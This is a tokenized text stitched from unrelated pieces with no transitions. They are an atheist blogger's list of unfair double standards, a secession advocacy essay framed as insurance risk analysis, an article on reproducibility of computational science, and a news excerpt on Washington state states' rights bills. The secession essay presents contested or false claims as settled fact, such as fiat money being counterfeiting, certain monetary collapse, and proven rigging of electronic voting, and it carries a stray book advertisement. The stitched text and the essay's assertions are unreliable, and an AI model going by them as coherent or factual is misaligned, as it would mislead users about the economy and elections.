But when we 're honest about disagreements among us , we get derided and dismissed for the supposed " schisms " that are supposedly dooming our movement to failure .
Why this is untrue and unfair : I am so tired of hearing about the " schisms " in the atheist movement , I could plotz .
Look .
We do n't have a central dogma or organization to split away from .
We 're a diverse movement with lots of differences among us ... and we do n't view that as a weakness .
We view it as a great strength .
Besides ... how does this make us different from any other movement for social change ?
In all of history , I can't think of any other social change movement that has n't had internal disagreements : disagreements large and small , disagreements over minor tactics and over major values and goals .
Sometimes movements set aside these differences to focus on what everyone agrees on ; sometimes they focus on these differences and try to hammer them out .
And sure , sometimes that hammering - out process results in pointless in - fighting ... but sometimes it results in real progress .
And in particular , the difference between firebrand confrontationalists and polite diplomacists -- the supposed " schism " in the atheist movement that the news media has been pissing itself over -- has existed in every single social change movement I can think of .
And while it can be a source of tension , it can also very much work in our favor -- for the same reasons that every other social change movement in history has been able to play " good cop , bad cop " to their advantage .
When atheists say we do n't believe in God , we 're told that we can't possibly be moral people .
But when we make our morality clear in word and deed , many believers insist that we must be spiritual or religious or following God unconsciously -- even if we deny it .
Why this is untrue and unfair : Talk about an unfalsifiable hypothesis !
If any act of morality gets seen as an act of spirituality by definition , is there any possible way atheists can prove that we genuinely do n't believe in God ?
Do we have to eat babies or push little old ladies in front of buses to prove that we 're not religious ?
To say that ethical atheists must be motivated by religion is a classic case of assuming the thing you 're trying to prove .
And it 's completely unfalsifiable : no possible evidence could show that it 's wrong .
If atheists behave ethically , that somehow proves that we 're really religious ; if we behave badly , it somehow proves that atheism is inherently bad and leads people away from morality .
It could n't possibly be that atheists are just human beings -- mixes of good and bad , some tilted more in one direction than others .
And it could n't possibly be that our lack of belief in any sort of god is entirely sincere .
As long as we do n't know exactly how organic life began from non-life , then atheists ' conclusion that life almost certainly began as physical cause and effect will be called blind faith in materialism .
But if we can replicate abiogenesis ( the origins of life from non-life ) in the laboratory -- something that 's expected to happen in the next few years -- this will be seen as proof that life had to be intentionally created .
After all , it required people working in a lab for decades to make it happen !
Why this is untrue and unfair :
This one drives me up a tree .
The conclusion that life almost certainly began as a chemical process is not blind faith .
It 's a reasonable conclusion based on the evidence .
The overwhelming body of evidence supports the conclusion that life is a physical , biochemical process , developed into its current state of complexity and diversity by the natural process of evolution .
It is reasonable to conclude that this phenomenon began as a physical , proto - biochemical process .
And when / if abiogenesis does get replicated in the lab , that 's hardly proof that life had to be designed .
I 'm sorry , but that 's just silly .
Natural processes get replicated in the lab all the time .
We grow mold in Petri dishes -- does that mean mold can't occur naturally ?
If atheists do n't offer specific arguments and evidence supporting atheism , we get told , " See ?
Atheism is just as much a matter of faith as religion . "
But when we do provide evidence and arguments for our position , we get accused of proselytizing .
Why this is untrue and unfair : Sometimes when atheists write about atheism , we take God 's non-existence as a given .
Like pretty much everyone else in the world , we do n't always want to discuss first principles ; we sometimes want to move on to other topics , such as movement strategy , or the dissemination of critical thinking skills , or who 's the sexiest atheist .
We 've made the " God does n't exist " argument elsewhere , and we do n't want to recap it every single time .
That does n't make atheism an article of faith .
It makes it a conclusion that we 've reached and are moving on from .
( If you really want to know what our evidence and our arguments are for our non-belief , we can usually point you at something . )
As for the accusation that we 're proselytizing :
All too often , the word " proselytizing " gets tossed around when what 's really meant is , " attempted persuasion by people I do n't agree with . "
Persuasion is not proselytizing .
And if you insist that it is , then you 'll have a hard time explaining what 's so bad about it .
Religion is a hypothesis about the world : the hypothesis that things are the way they are , at least in part , because of supernatural entities or forces acting on the natural world .
And there 's no good reason to treat it any differently from any other hypothesis .
Which includes pointing out its flaws and inconsistencies , asking its adherents to back it up with solid evidence , making jokes about it when it 's just being silly , offering arguments and evidence for our own competing hypotheses ... and trying to persuade people out of it if we think it 's mistaken .
It 's persuasion .
It 's the marketplace of ideas .
Why should religion get a free ride ?
If atheists admit that they can't be 100 % certain of God 's non-existence , believers pounce on that fragment of uncertainty , and atheism gets accused of being as much a matter of faith as religion .
But if atheists insist that they are 100 % certain that God does not exist ( or as close to 100 % certain as anyone can be ) , then believers pounce in that certainty ... and atheism gets accused of being as much a matter of faith as religion .
Why this is untrue and unfair :
This is one of my pet peeves .
It 's just so transparently unfair .
We do n't apply the " absolute 100 % certainty " standard to any other type of conclusion .
If we conclude that the cat is somewhere in the house even though we can't see it , or that there is n't a pink pony behind our sofa that teleports to Guam the minute we look back there , or that the earth is orbiting the sun , nobody insists that these conclusions are articles of faith just because there 's an infinitesimal hypothetical possibility that we might be wrong .
These are seen as reasonable conclusions , based on the available evidence .
So when atheists say , " No , I 'm not 100 % sure that there is no God , there 's almost nothing that we can be 100 % sure of -- but so what , we can still make reasonable conclusions about what 's probable and plausible based on the available evidence , and all the evidence we have now points to God not existing , so I feel confident in rejecting the God hypothesis unless I see better evidence " ... that does n't make our atheism an article of faith .
And when other atheists say , " Yes , I 'm 100 % sure that there is no God : the fragment of hypothetical possibility that God exists is so insignificant that it's not even worth considering , I 'm 100 % certain that there are no leprechauns or unicorns -- or as close to 100 % as anyone could reasonably expect -- and I see no reason to treat God any differently " ... then again , that does n't make their atheism an article of faith .
The only thing that would make atheism a true article of faith would be if atheists said , " Nothing you could possibly say , nothing I could possibly see or experience , no evidence you could possibly provide me , could ever convince me that my atheism was wrong .
My belief in the non-existence of God is an a priori assumption : it is unshakable , as constant as the Northern Star . "
And I have yet to encounter an atheist who says that .
Finally -- and maybe most crucially of all :
When we speak out in any way about our atheism -- and when we continue to organize , and to make ourselves and our ideas more visible and vocal , and to generally turn ourselves into a serious movement for social change -- we get accused of being hostile , fanatical , rude , evangelical , bigoted , and extremist .
But if we do n't speak out , if we do n't organize , if we do n't forge ourselves into a powerful and visible movement ... then the bigotry and misinformation and discrimination against us will continue unabated .
Why this is untrue and unfair :
We really can't win on this one .
Even the most mild forms of atheist activism and visibility result in believers accusing us of disrespect , intolerance , and forcing our beliefs on others .
If we do something as mild and unthreatening as putting up bus ads saying " You can be good without God " or " Do n't believe in God ?
You are not alone , " you can bet good money that plenty of believers will get worked up about how those terrible atheists are insulting Christians and other believers .
The purest act of visibility -- the simple act of standing up and saying out loud , " Atheists exist and are good people " -- gets treated as another example of the offensive , dogmatic , in - your - face extremism of the atheist movement .
But here 's the skinny :
There has never once been a marginalized group who has won recognition and rights by sitting back and waiting politely for it to happen .
There has never once been a marginalized group who has won recognition and rights by doing anything other than speaking out , organizing , making themselves visible and vocal .
As Martin Luther King Jr. said , " Freedom is never voluntarily given by the oppressor ; it must be demanded by the oppressed . "
So you 'll have to forgive us if we take the accusations of our offensive , dogmatic , in - your - face extremism with something of a grain of salt .
You 'll have to forgive us if we listen to the concerned advice from believers about how our confrontational tactics are alienating people and we need to dial it back ... and respond by giving it the horse laugh , and continuing to do what we 've so successfully been doing .
You 'll have to forgive us if we treat the attempts to quiet us down as attempts to shut us up .
If you have a valid critique of a particular atheist or atheist idea , by all means , speak up .
And if you have what you think is a valid critique of the atheist movement as a whole , we'd be interested to hear about it .
We 're not perfect , and we do n't claim to be .
But please make sure your criticisms are fair .

My business expertise is in the Insurance Risk Management field .
I consult individuals and businesses on the best ways to manage their risks .
So , when considering the concepts of secession for US states , I look at their exposures to risk and the actions they can take to minimize their risks .
Here are just a few of the risk exposures that states and individuals face , and solutions to manage those risks in the best ways .
Monetary Collapse
The risk here is collapse of the dollar ’s value , leaving anyone with dollar holdings and earnings with nearly worthless money .
Add to that risk the precursor to collapse , which would be bank closings and suspension of credit card usage .
A medium of exchange is necessary for commerce .
If your medium of exchange becomes worthless , your ability to engage in commerce will rely only on barter .
And , for most individuals , barter is a very limited medium of exchange .
What would a normal city - dweller take to the grocer to exchange for food ?
You likely have nothing the grocer needs .
Article I , Section 8 of the US Constitution clearly states that the Congress shall have the power to " coin money , regulate the value thereof , and of foreign coin , and fix the standard of weights and measures . "
Delegating this power to the Federal Reserve was unconstitutional .
The word is " coin " money , a verb .
That means minting coins , not printing paper currency .
The printing of irredeemable paper currency without underlying precious metal value is counterfeiting .
The US Congress has spent trillions of dollars of worthless paper money and taken on more trillions in debt .
There is only one sure consequence of counterfeiting , and that is the collapse of the monetary system .
Eventually , the money will become worthless .
But before that occurs , the money will go through a period of massive inflation .
It will look as though prices for goods and services are skyrocketing , but that is simply the way that inflation manifests itself in the marketplace .
Today it takes a dollar to buy what a five - cent - piece would buy in the 1930s .
The dollar ’s value has diminished by 95 % in that time .
That also means that a person earning $ 100,000 in today ’s money could have lived the same standard of living in 1930 for $ 5,000 .
The nations of the world made the gold - backed dollar the reserve currency for the world .
A " reserve " currency means that every nation agreed to accept dollars in payment of debts .
But now that the dollar has no real value , the world is forsaking the dollar as reserve .
The world looks into America ’s future and sees no willingness toward fiscal responsibility or even the resolve to support the value of the dollar .
Eventually the world will supplant the dollar with another reserve currency .
When other nations are unwilling to accept dollars , any remaining value in American dollars will vanish .

A sub-risk in this topic is the timing and procedure used by the nations of the world as they move away from dollars .
To prevent a worldwide collapse of the financial system , all nations must make perfectly - timed decisions relating to divesting themselves of American debt securities .
Statistically , the chance for a mistake in timing among the nations of the world is extremely high .
That means that collapse could happen very suddenly and without warning .
Monetary collapse in the United States is unavoidable .
There is nothing that Washington is willing to do to avert the disaster .
There is nothing that Washington could do to avert the disaster .
They have already gone over the cliff .
They simply have n’t hit bottom yet .
Any new nation that replicates US monetary policy will suffer the same consequences over time .
A new nation that establishes a gold and silver - backed monetary system , in which gold and silver coins are the only true money , will thrive .
A new nation has only two choices for a new monetary system .
Choice
One is a gold and silver standard , sound money , no inflation and no debt .
Choice
Two is counterfeit currency , fractional reserve banking and loans from the International Monetary Fund to operate .
Choice
One guarantees liberty .
Choice
Two guarantees financial slavery .
A state that secedes from the Union to form a new nation must establish their monetary system before they do anything else .
All private , public and commercial exchange , and the viability of the new nation will turn on this one decision .
Taxation
The risk here is ever - increasing taxation to levels that are unsustainable , reducing citizens to serfs and state property .
Americans are taxed in every way possible .
There are personal income taxes , business income taxes , capital gains taxes , inheritance taxes , user fees , property taxes , license fees , sales taxes , Social Security and Medicare taxes and many others .
The Federal tax code runs into the thousands of pages , and is so complicated that even the IRS cannot agree on the meaning of the code .
The Federal Government has cleverly required employers to collect taxes at the paycheck level , making American employers the tax collectors for the Feds .
But this also has the effect of making people seemingly unaware of the total tax burden confiscated from them .
The concept of voluntary taxation is pure fiction .
In a new nation , all of the US Federal taxation would cease .
Not one more dollar would flow to Washington .
Hundreds of billions of dollars would not be extracted by force from individuals in the new nation and sent to Washington .
Every individual and business that earns income would immediately begin receiving the gross amount of their earnings .
So , if your weekly salary was $ 1,000 , your paycheck would be for $ 1,000 .
Imagine that !
The method of taxation that carries the lowest risk of abuse , and the highest levels of individual liberty is the national sales tax .
A new nation could opt for no income tax , which would mean no income tax withholding .
A new nation could raise their revenue from only sales tax , rather than a mix of taxation schemes .
A national sales tax pulls revenue from all commerce in the new nation , not just citizens .
Property taxes could be entirely abandoned as a taxation scheme .
The only tax code that would exist is the codification of the sales tax .
There would be no other code necessary , no individual tax filings , no tax liens , no tax foreclosures .
There would be no deductions and no tax - exempt organizations .
The new national sales tax could be divided among the counties and cities as needed .

Voter Fraud
The risk here is that when voting cannot be determined to be accurate , confidence in the outcome of an election or referendum vanishes .
In addition , this means that voting outcomes can be manipulated .
In America , voting has become an anachronistic relic , and only serves to placate the populace and deceive them into believing that their vote counts for something .
It has been proven over the last 10 — 15 years that electronic voting machines are wholly unreliable and that their systems can be hacked to change voting outcomes .
Therefore , when voting outcomes can be rigged , all elections and referendums are subject to suspicion .
This happens from the highest office to the lowest , and in every referendum .
The only way to alleviate this problem is through a physical ballot system , which can be counted and verified .
A new nation will have the ability to organize the new government any way it wishes to protect the integrity of the voting process .
US Debt Level
The risk here is bankruptcy and dissolution of the US Federal Government .
The US debt is almost unknowable .
There are so many spending programs that are not considered in Generally Acceptable Accounting Principles ( GAAP ) on government books that the brightest minds cannot know the total amount of Congressional spending .
Congress increases the so - called debt ceiling in every session of Congress , recognizing absolutely no restraint on their ability to spend .
A new nation will instantly forsake the US debt , leaving Washington and the remaining United States to fend for themselves .
The new nation plots its new course with no debt .
Regulation
The risk here is that unconstitutional Federal regulations stifle human behavior and commerce , steal individual rights and liberty , and make good governance impossible .
There is not one second of any 24 - hour period in which an American citizen is not regulated by some law .
There is not one human act that an American citizen can do that is not regulated by some Federal law .
Even thoughts are regulated in today ’s America when you consider hate crimes laws on the books .
A new nation would start with no burdensome regulations .
This would allow maximum freedom for the individual .
Health Care
The risk here is that health care in the USA has been regulated so much by the Federal Government that it is becoming unmanageable .
The unconstitutional health care legislation currently being negotiated in Congress will add thousands more pages to Federal regulations , and make matters worse for individuals and insurance companies .
A new nation will have no health care system .
But if the citizens of the new nation decided that they wanted to spend their own money on a national healthcare system , they could do so with only their own resolve and funds .

War and Defense Spending
The risk here is that America is experiencing negative outcomes from its foreign policy decisions , which are carried out by the military .
Any military action done outside the borders of the United States is an offensive action .
You cannot defend your country by attacking another on their soil .
Defense means to defend , to repel , to thwart attack .
Maintaining military bases on foreign soil is unconstitutional and costly .
The defense budget for the United States has become so large that it can scarcely be controlled .
And it ’s more than just prosecuting foreign wars that runs up the cost .
Hundreds of billions are spent annually for new weapons systems that are unnecessary , as well as maintaining the existing weapons systems .
Every one of the 50 states has either a military base or businesses that help produce military goods … or both .
The Department of Defense cleverly planned it that way so that cutbacks would be very unpopular and difficult to achieve .
In a new nation , properly organized , there would be no standing army , but a citizen militia , just like each state had in 1776 .
A new nation would walk away from the gigantic defense budget of the USA .
If a new nation wanted new weapons systems , it would have to look to its founding documents for authority , then pay for the new toys itself .
Social Programs
Over time , Americans have had an intolerably heavy burden of social spending laid on their backs .
Many programs are so deeply buried in the Federal budget that they are known only to the ones who benefit from them .
Programs like farm subsidies , loan guarantees , and thousands of government grants given out to either promote or prevent certain human actions fill the various Cabinet - level agencies ’ spending .
We usually only discuss Social Security and Medicare , but think about obscure pork barrel projects .
The long list of pet projects passed by Congress in a record deficit year includes $ 1.8 million to study why pigs smell .
Other gems include $ 1.9 million for a water taxi in Connecticut , $ 3.8 million to preserve a baseball stadium in Detroit and $ 380,000 for a fairground in Kotzebue , Alaska , just above the Arctic Circle .
In a new nation , all of the criminal , unconstitutional spending done by all the 50 states vanishes overnight .
The new nation is free from the burden of contributing their hard - earned money to waste and fraud .
Education
The risk under consideration is whether the state has an obligation to educate its citizens or not .
If the new nation decides to fund education , it must collect more taxes from the people residing in the new nation .
If it decides to forego compulsory education and allow parents to educate their own children and themselves , the new nation will allow for maximum individual liberty and responsibility .

Immigration
The risk in immigration is normally the strain it places on government services .
But a new nation , properly organized and formed , would turn the immigration question on its head , and make many of the immigration concerns irrelevant .
If the new nation adopted the " corporation model , " no immigrant could gain citizenship without a procedure of some sort .
No children born of immigrants would achieve automatic citizenship .
If the new nation resisted the Siren ’s song to pay welfare benefits , there would be no drain on the coffers of the new nation .
The free marketplace would handle the influx of new individuals coming to the new nation to live .
They would have to work and earn income , or leave the way they came .
The new nation could also use its citizenship as an incentive to attract the most talented immigrants from around the world .
Prices for goods , services , food and housing would accurately reflect supply and demand and directly affect immigration .
Said another way , why would you immigrate to the new nation if you could not find work , housing , food , and you knew there were no welfare benefits ?
But if work , housing and food were available , the immigrant would contribute to the new society .
Constitutional Governance
I left this point until last to emphasize the greatest risk of all .
The risk here is how to prevent fraud .
The US Constitution is a mere compact between parties , and it cannot bind any two parties into a legal contract .
Consequently , the US Federal Government can enact any legislation it pleases and spend any money it pleases in any manner it pleases .
It truly answers to no one but itself .
So the general understanding of constitutional law is misleading .
My points listed above that direct your attention to the US Constitution are true , but the fact that the Constitution has no authority makes many of the arguments moot .
It does not , however , diminish the risk for a seceding state .
If anything , it increases the political risk .
Any new government not founded on contract law is less than a gentlemen ’s agreement affirmed with a handshake .
A new nation would have the opportunity to create a new form of government that is actually a legal contract between all parties .
The new government could be structured like a corporation .
Each person who wanted citizenship would be required to execute a legal contract .
No one would be automatically born into citizenship , but would have to attain the age of majority before becoming eligible for citizenship .
Stock and voting rights would be issued to each citizen .
Conclusion
The overall recognition of risk found in this article is that a government not strictly limited cannot be controlled , and in such nations , individual liberty is lost .
The Revolution : A Mani ... Ron Paul Best Price : $ 1.99 Buy New $ 6.99 ( as of 11:00 EST - Details )
But a government strictly limited in authority and scope can be successfully managed with the goals to " establish justice , insure domestic tranquility , provide for the common defense , promote the general welfare and secure the blessings of liberty to ourselves and our posterity " ( excerpted from the Preamble of the US Constitution ) .
Try to envision yourself and your family in a new nation created by secession .
All the people you meet are excited and breathless in their anticipation of the future .
The general opinion of the populace is pure unbridled optimism .
The new nation ’s economy is booming , the money is backed by gold and silver , and there is no inflation .
" Now Hiring " signs are in all the shop windows .
The newspaper ’s " Help Wanted " ads are packed full .
Prices for goods and services are low , and the stores are loaded with goods .
Manufacturers are streaming into the new nation to take advantage of the rare pro-business atmosphere .
Wages are climbing steadily in manufacturing jobs as companies compete for the best and brightest to be their employees .
New businesses are being created at a fever pace .
Residential and commercial construction is at a high level to meet the demand of the new residents .
All because one state recognized this historic opportunity and chased the dream of liberty through the process of state secession .
Secession is the hope for mankind .
Who will be first ?
The Best of Russell D. Longcore
In recent years , scientists may have inadvertently given up on a key component of the scientific method : reproducibility .
That 's an argument that 's being advanced by a number of people who have been tracking our increasing reliance on computational methods in all areas of science .
An apparently simple computerized analysis may now involve a complex pipeline of software tools ; reproducing it will require version control for both software and data , along with careful documentation of the precise parameters used at every step .
Some researchers are now getting concerned that their peers simply are n't up to the challenge , and we need to start providing the legal and software tools to make it easier for them .
In the past , reproduction was generally a straightforward affair .
Given a list of reagents , and an outline of the procedure used to generate some results , other labs should be able to see the same things .
If a result could n't be reproduced , then it could be a sign that the original result was so sensitive to the initial conditions that it probably was n't generally relevant ; more seriously , it could be viewed as a sign of serious error or fraud .
In any case , the ability to reproduce a given result is key to its general acceptance and , since a successful experiment is often the foundation of further research , often essential for pushing a field forward .
Computation and the reproducibility crisis
But , when it comes to computational analysis , both the equivalent of reagents and procedures have a series of issues that act against reproducibility .
The raw material of computational analysis can be a complex mix of public information and internally generated data — for example , it 's not uncommon to see a paper that combines information from the public genome repositories with a gene expression analysis performed by an individual research team .
A lot of this data is in a constant state of flux ; new genomes are being completed at a staggering pace , meaning that an analysis performed six months later may produce substantially different results unless careful versioning is used .
In some cases , the data resides in proprietary databases .
Some of this work may run up against the issues of data preservation , as older information may reside on media that 's no longer supported or in file formats that are difficult to read .
And that 's just the data .
An analysis pipeline may involve dozens of specialized software tools chained together in series , each with a number of parameters that need to be documented for their output to be reproduced .
Like the data , some of these tools are proprietary , and many of them undergo frequent revisions that add new features , change algorithms , and so on .
Some of them may be developed in - house , where commenting and version control often take a back seat to simply getting software that works .
Finally , even the best commercial software has bugs .
The net result is that , even in cases where all the data and tools are public , it may simply be impossible to produce the exact same results .
And that has serious implications for the use of reproducibility in every sense : validating existing results by repeating them , determining their robustness by performing a distinct but overlapping analysis , and using the results as a basis for further research .
Perhaps most significantly , without a way of determining precisely what was done , it 's impossible to identify the differences that sometimes cause similar analyses to produce different results .
Putting the reproducibility into computational code
At this point , one might be tempted to make a misguided argument that the advent of computational tools means that it 's time for a major revision of the scientific method .
But reproducibility became a key component of that method precisely because it's so useful , which is why a number of people are pushing for the field to adopt standards to ensure that computational tools conform to the existing scientific method .
Victoria Stodden is currently at Yale Law School , and she gave a short talk at the recent Science Online meeting in which she discussed the legal aspects of ensuring that the code behind computational tools is accessible enough for reproducibility .
The obvious answer is some sort of Creative Commons or open source license , and Stodden is exploring the legal possibilities in that regard .
But she makes a forceful argument that some form of code sharing will be essential .
" You need the code to see what was done , " she told Ars .
" The myriad computational steps taken to achieve the results are essentially unguessable — parameter settings , function invocation sequences — so the standard for revealing it needs to be raised to that of when the science was , say , lab - based experiment . "
This sort of openness is also in keeping with the scientific standards for sharing of more traditional materials and results .
" It adheres to the scientific norm of transparency but also to the core practice of building on each other 's work in scientific research , " she said .
But the same worries that apply to more traditional data sharing — researchers may have a competitor use that data to publish first — also apply here .
In the slides from her talk , she notes that a survey she conducted of computational scientists indicates that many are concerned about attribution and the potential loss of publications in addition to legal issues .
( The biggest worry is the effort involved to clean up and document existing code . )
Still , this sort of disclosure , as with other open source software , should provide a key benefit : more interested parties able to evaluate and improve the code .
" Not only will we clearly publish better science , but redesigned and updated code bases will be valuable scientific contributions , " Stodden said .
" Over time , we wo n't stagnate forever on one set of published code . "
Putting the reproducibility into computational code
Even if we solve the legal and computational portions of the problem , however , we 're going to run into issues with the fact that many of the people who use computational tools understand what they do , but do n't feel compelled to learn the math behind them .
That 's where a paper in the latest edition of Science comes in .
Its author , Jill Mesirov of the Broad Institute , describes how many biologists are n't well versed in computational analysis , but are increasingly reliant on tools created by those who are ; she then goes on to describe one type of solution , called GenePattern , that she and her colleagues put together with the help of Microsoft Research .
The idea is that the researchers that rely on computational techniques as part of their day - to - day activities need an entire " reproducible research system " that will make it easier for them to document the sources of their data and the analyses performed on it .
The system they 've designed shares features with rapid application development environments , as it graphically represents modular computational tools , which can be ordered to create an analysis pipeline , and the individual settings for each can be tweaked .
Once complete , the user can trigger the analysis to run ; the system documents all of the relevant settings and software information .
Microsoft got involved because Mesirov was apparently inspired by the fact that it 's possible to embed a spreadsheet in a word processing document and leave it accessible to all the standard tools for manipulating that data .
So , the GenePattern software includes a Word plugin that can embed the output of any data created using these tools , such as a table or chart .
When clicked , the full GenePattern environment makes all the information about the experiment — the software and settings used , for example — accessible to the reader .
It 's even possible to rerun the same analysis , a sort of point - and - click reproducibility .
There are clearly some limitations to this implementation .
Although the software is cross-platform , the plug - in is not .
Publishers have standardized on PDFs ( not Word docs ) for distributing research papers , and GenePattern is limited to those analysis tools that have been adapted to work with it .
But there 's no question that it's the right sort of approach , as it implicitly recognizes that just about anyone doing science is now doing some form of computation , and very few of them are likely to be fully cognizant of everything that 's involved in making sure their documentation is sufficient to ensure reproducibility .
Unless the tools that do the analysis are designed to do so for them , a lot of this critical information is likely to be lost to the rest of the scientific community .
States ’ rights , the call to arms of secessionists during the Civil War , is making a comeback in state legislatures around the country as the Tea Party movement gains ground .
In Olympia , Rep. Ed Orcutt , R - Kalama , has joined with other House Republicans in sponsoring several states ’ rights bills invoking the 10th Amendment to the U.S. Constitution , which states , “ The powers not delegated to the United States by the Constitution , nor prohibited by it to the States , are reserved to the States respectively , or to the people . ”
The bills ’ sponsors , led by Rep. Matt Shea , R - Spokane Valley , argue that the states must resist federal law on a broad range of issues , from reducing greenhouse gas emissions to regulating firearms sales to implementing national health care reform .
Shea won national prominence within the 10th Amendment movement last year when he sponsored a House joint resolution declaring Washington a sovereign state and calling on the federal government to ” cease and desist , effective immediately , any and all mandates that are beyond the scope of its constitutionally delegated power . ”
The resolution failed in Olympia , but the Idaho Legislature later adopted a version of it , Shea ’s office said .
